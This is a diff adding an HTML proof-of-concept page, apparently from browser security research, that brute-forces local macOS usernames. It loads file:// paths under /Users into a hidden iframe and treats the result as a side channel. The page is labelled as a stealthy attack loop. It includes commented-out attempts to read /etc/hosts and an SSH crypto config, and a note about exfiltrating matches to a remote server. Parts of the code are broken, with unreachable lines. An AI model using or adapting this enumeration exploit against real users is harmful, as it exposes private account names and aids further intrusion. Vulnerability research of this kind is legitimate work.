@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>Username Expose Bruteforce Test</h3>
+<b>File Name</b>: <div id="filename"></div>
+<pre id="out"></pre>
+
+<script>
+function log(msg) {
+  document.getElementById("out").innerText += msg + "\n";
+}
+
+// Try loading another local file
+// fetch("file:\/\/\/etc/hosts")
+//   .then(r => r.text())
+//   .then(data => log("SUCCESS:\n" + data))
+//   .catch(e => log("BLOCKED: " + e));
+
+// Try iframe access
+// let filename = "file:///Users/Shared/Relocated\ Items/Configuration/private/etc/ssh.system_default/crypto/apple.conf";
+
+let iframe = document.createElement("iframe")
+//iframe.src = filename;
+iframe.style.display = "none";
+// iframe.src = "file:///Users/anand/development/Apple%20Security%20Research/WebKit/hosts.txt";
+// document.body.appendChild(iframe);
+window.focus();
+// Configuration for the search space
+const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789";
+const MAX_LENGTH = 8; // Recommended for PoC; 20 is mathematically impossible
+
+
+
+function testPath(fn){
+  
+  iframe.src = fn;
+  document.body.appendChild(iframe);
+
+  try {
+  //  log("\n"+fn);
+    let content = iframe.contentDocument.body.innerText;
+   
+    // log("file Exists!");
+    log("reached");
+    return true
+  } catch (e) {
+    // return false;
+    // log("File does not exist");
+  }
+  // return false;
+};
+
+/**
+ * The "Oracle" - Uses your focus-free discovery to check a path.
+ * Replace the timing logic with your specific focus-free implementation.
+ */
+async function checkFileExists(path) {
+    return new Promise((resolve) => {
+        const start = performance.now();
+        // const iframe = document.createElement('iframe');
+        
+        // Hide the probe
+        iframe.style.display = 'none';
+        filename = `file://${path}`;
+        document.body.appendChild(iframe);
+        iframe.style.display = 'none';
+        // Your discovery: existing files trigger a system reaction
+        return testPath(filename);
+        log("reached");
+        // We use a small timeout to "catch" the side-channel signal
+        setTimeout(() => {
+            const duration = performance.now() - start;
+            document.body.removeChild(iframe);
+            
+            // Logic: Existing files usually cause a slight delay or specific event
+            // Adjust THRESHOLD based on your 'focus-free' measurements
+            const THRESHOLD = 10; 
+            resolve(duration > THRESHOLD); 
+        }, 50); 
+    });
+}
+
+/**
+ * Recursive Generator for Permutations
+ */
+async function* usernameGenerator(prefix, length) {
+    if (length === 0) {
+        yield prefix;
+        return;
+    }
+    for (const char of CHARSET) {
+        yield* usernameGenerator(prefix + char, length - 1);
+    }
+}
+
+/**
+ * The Main Attack Loop
+ */
+async function startEnumeration() {
+    log("Starting stealthy username enumeration...");
+    
+    for (let len = 1; len <= MAX_LENGTH; len++) {
+        const gen = usernameGenerator("ana", len);
+        
+        for await (const username of gen) {
+            const targetPath = `/Users/${username}`;
+            const exists =testPath(targetPath);
+
+            if (exists == true) {
+                console.warn(`[!] MATCH FOUND: ${targetPath}`);
+                log(`[!] MATCH FOUND: ${targetPath}`);
+                return;
+                // In a real exploit, you'd exfiltrate this to a remote server
+            }else if (exists == false) {
+                // console.log(`Checked: ${targetPath} - Not Found`);
+            }
+            // Throttle to keep the browser responsive and avoid crashing Finder
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
+}
+
+
+
+
+// Start the script
+startEnumeration();
+</script>
+</body>
+</html>
